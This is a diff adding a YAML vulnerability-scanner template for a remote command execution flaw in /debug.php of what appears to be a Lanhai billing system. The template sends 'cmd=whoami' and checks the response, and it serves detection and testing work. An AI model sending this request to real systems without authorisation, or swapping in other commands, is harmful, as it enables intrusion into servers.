@@ -1,0 +1,18 @@
+name: lanhai-jifei-rce
+rules:
+  r0:
+    request:
+      method: POST
+      path: /debug.php?_t=0.01693626099009471
+      headers:
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 10
+        DNT: 1
+        Cookie: PHPSESSID=0ikmv5f65jkbu7afj19jmeu6s4
+      body: |
+        cmd=whoami
+    expression: response.status == 200 && response.headers["content-type"].icontains("text/html")  && response.body.bcontains(b'toor')
+expression: r0()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/gqlfmCYXA9xX5Ku-36ixaQ
